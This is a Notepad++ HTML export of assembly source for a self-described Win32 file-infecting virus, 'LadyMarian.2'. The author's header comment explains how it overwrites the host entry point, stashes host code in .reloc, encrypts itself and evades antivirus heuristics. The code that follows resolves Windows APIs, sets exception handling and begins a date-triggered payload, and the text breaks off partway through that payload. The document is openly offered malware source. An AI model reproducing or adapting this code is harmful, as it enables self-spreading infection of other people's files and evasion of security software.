<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Win32.LadyMarian.2</span><span class="sc0">
</span><span class="sc1">;    Coded By ValleZ.</span><span class="sc0">
</span><span class="sc1">;    Size:  848h bytes.    </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    This is my second virus and probably virus had not optimized code,or bad ideas,or</span><span class="sc0">
</span><span class="sc1">;    other things,but,as i said,its my second so im excused :P if its a lame virus.</span><span class="sc0">
</span><span class="sc1">;    Well,i thing this is a interesting virus becoz it infect with a method that i hadnt seen</span><span class="sc0">
</span><span class="sc1">;    before(however i dont say it no exist,but i havent seen it). Virus overwrite code </span><span class="sc0">
</span><span class="sc1">;    of host,over entry point,after it has copy host code in .reloc.When it returns to host</span><span class="sc0">
</span><span class="sc1">;    it copy again host to entry point and jmp there.Virus place return to host rutine in </span><span class="sc0">
</span><span class="sc1">;    imagebase + 26h, in word oeminfo and 5 * dword reserved.</span><span class="sc0">
</span><span class="sc1">;    Virus is encrypted with random key.</span><span class="sc0">
</span><span class="sc1">;    Virus no change flags of code section where it overwrite code of host becoz avs heuristic</span><span class="sc0">
</span><span class="sc1">;    could detect it. It use VirtualProtect api to set his memory as writable.</span><span class="sc0">
</span><span class="sc1">;    I want to include some antidebug rutines in virus code but finally i think better not</span><span class="sc0">
</span><span class="sc1">;    becoz size of virus is 848h bytes...and if it grow up very much probably it cannot infect</span><span class="sc0">
</span><span class="sc1">;    any file becoz it will be more big than reloc.</span><span class="sc0">
</span><span class="sc1">;    Virus doesnt increase size of file and no change entry point.</span><span class="sc0">
</span><span class="sc1">;    It places his own SEH and test files with SfcIsFileProtected api when sfc.dll exists.</span><span class="sc0">
</span><span class="sc1">;    It infects all files in his folder that can be infected.</span><span class="sc0">
</span><span class="sc1">;    In NT machines only infect if it has necesary permission.</span><span class="sc0">
</span><span class="sc1">;    In header it only change: ImageBase + 26h to ImageBase + 3ch,with code to return host.</span><span class="sc0">
</span><span class="sc1">;                              Byte 1 of TimeDateStamp in PEheader + 08h.</span><span class="sc0">
</span><span class="sc1">;                              Flags of .reloc to do it not discarcheable.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Payload: show a message box with no button :P close it with ctrl + alt + supr</span><span class="sc0">
</span><span class="sc1">;    No more things.</span><span class="sc0">
</span><span class="sc1">;    This virus is for Lady Mariam,the best girl in the world.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Thx:</span><span class="sc0">
</span><span class="sc1">;    Xezaw,my m3nt0r who shows me all i know :)</span><span class="sc0">
</span><span class="sc1">;    mscorlib,thx for that help that u gave me :) u r a genius :D</span><span class="sc0">
</span><span class="sc1">;    GriYo,thx u too for ur help too :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Sorry,my english is very bad so plz,excuse me.</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">



</span><span class="sc2">.586p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">


</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

                </span><span class="sc5">sizeVir</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">endVir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">startVir</span><span class="sc0">
                </span><span class="sc5">sizecrypt</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">decryptz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">retHost</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">startVir</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;registers preserved too</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">         
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">d_offset</span><span class="sc0">    </span><span class="sc1">;delta offset</span><span class="sc0">
</span><span class="sc5">d_offset</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">d_offset</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">decryptz</span><span class="sc0">
</span><span class="sc5">retHost</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">SEHout</span><span class="sc4">:</span><span class="sc0"> 
                    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">00000000h</span><span class="sc0">                       

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;SEH return                    </span><span class="sc0">
                    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc1">;ebp too was saved,so we can restore it</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">baseCalc</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">baseCalc</span><span class="sc4">:</span><span class="sc0">                                          
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">              
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">  </span><span class="sc1">;search for image base</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">baseCalc</span><span class="sc0">
    
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;dir of reloc</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;this header dword is modified </span><span class="sc0">
                               </span><span class="sc1">;when file is infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                  
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc12">'vz'</span><span class="sc0">            </span><span class="sc1">;test if this is a infected file,</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit</span><span class="sc0">               </span><span class="sc1">;second generation,i no test it with</span><span class="sc0">
                                   </span><span class="sc1">;or ebp,ebp becoz </span><span class="sc0">
                               </span><span class="sc1">;with this infection method</span><span class="sc0">
                               </span><span class="sc1">;sometimes ebp = 0 in 2º gen.</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">startVir</span><span class="sc4">]</span><span class="sc0">    
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">        </span><span class="sc1">;goto return code in image base + 26h</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">ReturnHost</span><span class="sc4">:</span><span class="sc0">             
                            
                               </span><span class="sc1">;return host code.It is put in dos </span><span class="sc0">
                               </span><span class="sc1">;header 5 reserved dwords + oeminfo.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sizeVir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            

</span><span class="sc5">again1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">rep</span><span class="sc0">   </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;copy host code in entry point direction </span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">   </span><span class="sc5">next1</span><span class="sc0">    </span><span class="sc1">;to recover the host body and</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">again1</span><span class="sc0">    </span><span class="sc1">;next jmp to entry point and begin</span><span class="sc0">
</span><span class="sc5">next1</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;execution of host.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">;i think some programs fails if not preserve</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc0">              
                </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ReturnHost_</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">vir</span><span class="sc4">:</span><span class="sc0">                    
                </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;small fix :P  </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SfcIsFileProtectedz</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;sometimes fault becoz </span><span class="sc0">
                                          </span><span class="sc1">;thought it has sfc api</span><span class="sc0">
                    
            
                </span><span class="sc1">;my SetWritrableCode rutine is prepared for with a few</span><span class="sc0">
                </span><span class="sc1">;changes can search a api directly from export.</span><span class="sc0">
                </span><span class="sc1">;really,rutine search VirtualProtect for </span><span class="sc0">
                </span><span class="sc1">;change virus pages to readable,writable and executable</span><span class="sc0">
                </span><span class="sc1">;but putting GetProcAddress offset in repuse + 2 and</span><span class="sc0">
                </span><span class="sc1">;putting a ret in a good site rutine will search </span><span class="sc0">
                </span><span class="sc1">;GetProcAddress and we not spend bytes in repeat code ;)</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GPA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">repuse</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c35bh</span><span class="sc0"> </span><span class="sc1">;pop ebx,ret</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">repuse2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetWritableCode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">       
                
                </span><span class="sc1">;of course after use rutine for our propose</span><span class="sc0">
                </span><span class="sc1">;we must rewrite good offset of VP and good code</span><span class="sc0">
                </span><span class="sc1">;where we write ret becoz when infect next generation</span><span class="sc0">
                </span><span class="sc1">;file the code of rutine must be the first</span><span class="sc0">


                </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VP</span><span class="sc4">]</span><span class="sc0">     
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">repuse</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">6a54h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">repuse2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">               
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetProcAddressz</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0"> 


</span><span class="sc1">;we have GetProcAddress,we can be happy! We can get all apis we need and </span><span class="sc0">
</span><span class="sc1">;we can start to infect files ;)</span><span class="sc0">
</span><span class="sc1">;next code calc apis</span><span class="sc0">
</span><span class="sc1">;In data apis must be in this form:</span><span class="sc0">
</span><span class="sc1">;api1kernel 0 api2kernel 0 ... apiNkernel 00 Library1nxt 0 api1nxtLib 0 api2nxtLib 0 </span><span class="sc0">
</span><span class="sc1">;... apiNnxtLib 00 ... LibreriaNnxt 000  </span><span class="sc0">
</span><span class="sc1">;00 is change of library and 000 is finish of apis</span><span class="sc0">

                
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ApisNames</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetProcAddressz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dirApis</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">nextAPI</span><span class="sc4">:</span><span class="sc0">                
                
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetProcAddressz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">       
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">      
</span><span class="sc5">searchApis</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">         
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">searchApis</span><span class="sc0">      
                
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">            
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">        
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nextAPI</span><span class="sc0">
                                    
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">         
                    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">allApisFounds</span><span class="sc0">   

                    
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kern</span><span class="sc4">]</span><span class="sc0">             
                </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">IsKern</span><span class="sc0">

</span><span class="sc5">IsKern</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LoadLibraryAz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;por la sfc.dll en 9x</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">allApisButSfcNot</span><span class="sc0">
                               
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">       
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">      
                          
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">searchApis</span><span class="sc0">              


</span><span class="sc5">allApisButSfcNot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">allApisFounds</span><span class="sc4">:</span><span class="sc0">          

    
</span><span class="sc5">SEH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;set SEH for me,save ebp too                         </span><span class="sc0">
            
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">retHost</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">      
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SEHout</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">  
                

                
</span><span class="sc1">;payload only show a message box if 23-7-XX,but when i had a moment ill put some payload</span><span class="sc0">
</span><span class="sc1">;a few more original :P</span><span class="sc0">

</span><span class="sc5">Payload</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;payload (only 9x)</span><span class="sc0">
            
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVersionz</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">08000000h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FirstFile</span><span class="sc0">                           
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SystemTime</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetSystemTimez</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ESI.ST_wMonth</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">FirstFile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ESI.ST_wDay</span><span class="sc4">],</span><span class="sc2">23</span><span class="sc0">    
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">FirstFile</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pay</span><span class="sc4">]</span><span class="sc0">
